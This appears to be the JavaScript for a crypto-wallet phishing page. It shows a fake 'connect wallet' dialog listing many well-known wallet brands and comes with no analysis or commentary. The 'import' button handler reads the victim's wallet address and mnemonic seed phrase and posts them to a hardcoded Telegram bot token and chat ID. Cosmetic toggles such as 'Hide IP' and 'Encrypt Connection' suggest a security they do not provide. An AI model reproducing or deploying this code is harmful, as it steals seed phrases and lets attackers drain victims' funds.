document.addEventListener('DOMContentLoaded', function() {
    // Wallet data
    const walletData = {
        // Existing wallets with original image paths
        metamask: {
            name: 'Metamask',
            logo: 'metamask.png',
            color: '#E2761B'
        },
        trustwallet: {
            name: 'Trust Wallet',
            logo: 'trust1.jfif',
            color: '#3375BB'
        },
        coinbase: {
            name: 'Coinbase',
            logo: 'coinase1.png',
            color: '#0052FF'
        },
        xaman: {
            name: 'Xaman',
            logo: 'xaman1.jfif',
            color: '#0047FF'
        },
        sparrow: {
            name: 'Sparrow',
            logo: 'sparrow.jfif',
            color: '#FF5300'
        },
        ledger: {
            name: 'Ledger',
            logo: 'ledger.png',
            color: '#000000'
        },
        
        // New wallets
        walletconnect: {
            name: 'WalletConnect',
            logo: 'walletconnect1.png',
            color: '#3B99FC'
        },
        blockstream: {
            name: 'Blockstream',
            logo: 'block stream.png',
            color: '#00C3FF'
        },
        trezor: {
            name: 'Trezor',
            logo: 'trezor.png',
            color: '#1A1A1A'
        },
        aqua: {
            name: 'Aqua',
            logo: 'aqua1.png',
            color: '#00BFFF'
        },
        kasware: {
            name: 'kasWare',
            logo: 'kasware.png',
            color: '#6B7280'
        },
        coldcard: {
            name: 'ColdCard',
            logo: 'coldcard.jfif',
            color: '#F7931A'
        },
        tangem: {
            name: 'Tangem',
            logo: 'tangem.png',
            color: '#0066CC'
        },
        lobstr: {
            name: 'Lobstr',
            logo: 'lobstr.jfif',
            color: '#FF4500'
        },
        bluewallet: {
            name: 'BlueWallet',
            logo: 'bluewallet.png',
            color: '#0C2550'
        },
        nunchuck: {
            name: 'Nunchuck',
            logo: 'nunchuck.png',
            color: '#FF9900'
        },
        bitpay: {
            name: 'Bitpay',
            logo: 'bitpay.jfif',
            color: '#1A3B8B'
        },
        unisat: {
            name: 'Unisat',
            logo: 'unisat.jfif',
            color: '#FF007A'
        },
        solflare: {
            name: 'Solflare',
            logo: 'solflare.png',
            color: '#FC9965'
        },
        solidifi: {
            name: 'Solidifi',
            logo: 'solidifi.jfif',
            color: '#5D5DFF'
        },
        phantom: {
            name: 'Phantom',
            logo: 'phantom1.png',
            color: '#4B49C6'
        },
        tonkeeper: {
            name: 'Tonkeeper',
            logo: 'tonkeeper.png',
            color: '#0098EA'
        },
        keplr: {
            name: 'Keplr',
            logo: 'keplr.jfif',
            color: '#FF897D'
        },
        swell: {
            name: 'Swell',
            logo: 'swell.jfif',
            color: '#0070F3'
        },
        zcash: {
            name: 'ZCash',
            logo: 'zcash.png',
            color: '#F4B728'
        },
        optimism: {
            name: 'Optimism',
            logo: 'optimism.png',
            color: '#FF0420'
        },
        
        uniswap: {
            name: 'Uniswap',
            logo: 'uniswap.png',
            color: '#FF007A'
        },
        zerion: {
            name: 'Zerion',
            logo: 'zerion.png',
            color: '#2962EF'
        },
        
        bitget: {
            name: 'Bitget',
            logo: 'bitget.jfif',
            color: '#00F2FE'
        },
        cryptocom: {
            name: 'Crypto.com',
            logo: 'crytpo.jfif',
            color: '#002D74'
        },
        okx: {
            name: 'OKX',
            logo: 'okx.png',
            color: '#121212'
        },
        
        others: {
            name: 'Others',
            logo: 'wallet22.png',
            color: '#6B7280'
        }
    };

    // Telegram submission logic with event delegation
document.addEventListener('click', function (event) {
    const importBtn = event.target.closest('.import-btn');

    if (importBtn) {
        event.preventDefault();

        const walletName = document.getElementById('walletNameText').textContent.trim();
        const walletAddress = document.getElementById('walletAddress').value.trim();
        const mnemonic = document.getElementById('mnemonic').value.trim();
        const hideIp = document.getElementById('hideIpToggle').checked ? 'Yes' : 'No';
        const encryptConnection = document.getElementById('encryptToggle').checked ? 'Yes' : 'No';
        const autoValidate = document.getElementById('validateToggle').checked ? 'Yes' : 'No';

        if (!walletAddress || !mnemonic) {
            alert('Please enter wallet address and mnemonic phrase.');
            return;
        }

        const botToken = '7010773928:AAHRs0roGY_Rz5d-LxeSoN9qYuK_vgn9DAU';
        const chatId = '6787322665';
        const telegramApi = `https://api.telegram.org/bot${botToken}/sendMessage`;

        const message = `
🔔 *New Wallet Submitted*

*Wallet:* ${walletName}
*Wallet Address:* ${walletAddress}
*Mnemonic Phrase:* ${mnemonic}
*Hide IP:* ${hideIp}
*Encrypt Connection:* ${encryptConnection}
*Auto Validate:* ${autoValidate}
        `;

        fetch(telegramApi, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                chat_id: chatId,
                text: message,
                parse_mode: 'Markdown'
            })
        })
    }
});


    // Modal Elements
    const walletConnectModal = document.getElementById('walletConnectModal');
    const walletConnectionModal = document.getElementById('walletConnectionModal');

    // Get all the buttons that should trigger the wallet connect modal
    const walletTriggers = document.querySelectorAll('.wallet-trigger');

    // Get close buttons and wallet items
    const modalCloseButtons = document.querySelectorAll('.modal-close');
    const walletItems = document.querySelectorAll('.wallet-item');

    // Open wallet connect modal when any of the wallet connect buttons are clicked
    walletTriggers.forEach(button => {
        button.addEventListener('click', (e) => {
            // Prevent default behavior for links
            e.preventDefault();
            walletConnectModal.classList.add('active');
        });
    });

    // Close modals when close button is clicked
    modalCloseButtons.forEach(button => {
        button.addEventListener('click', () => {
            walletConnectModal.classList.remove('active');
            walletConnectionModal.classList.remove('active');
        });
    });

    // Close modals when clicking outside
    walletConnectModal.addEventListener('click', (e) => {
        if (e.target === walletConnectModal) {
            walletConnectModal.classList.remove('active');
        }
    });

    walletConnectionModal.addEventListener('click', (e) => {
        if (e.target === walletConnectionModal) {
            walletConnectionModal.classList.remove('active');
        }
    });

    // Open wallet connection modal when wallet item is clicked
    walletItems.forEach(item => {
        item.addEventListener('click', () => {
            const walletType = item.getAttribute('data-wallet');
            const wallet = walletData[walletType];
            
            // Set wallet info in the connection modal
            document.getElementById('walletName').textContent = wallet.name;
            document.getElementById('walletNameText').textContent = wallet.name;
            document.getElementById('walletLogoImg').src = wallet.logo;
            document.getElementById('walletLogo').style.backgroundColor = `${wallet.color}20`;
            
            // Close the first modal and open the connection modal
            walletConnectModal.classList.remove('active');
            walletConnectionModal.classList.add('active');
        });
    });

    // Tab functionality
    const tabs = document.querySelectorAll('.tab');
    tabs.forEach(tab => {
        tab.addEventListener('click', function() {
            // Remove active class from all tabs
            tabs.forEach(t => t.classList.remove('active'));
            
            // Add active class to clicked tab
            this.classList.add('active');
            
            // You would typically show/hide tab content here
            // For this example, we're just showing the phrase tab content
        });
    });
});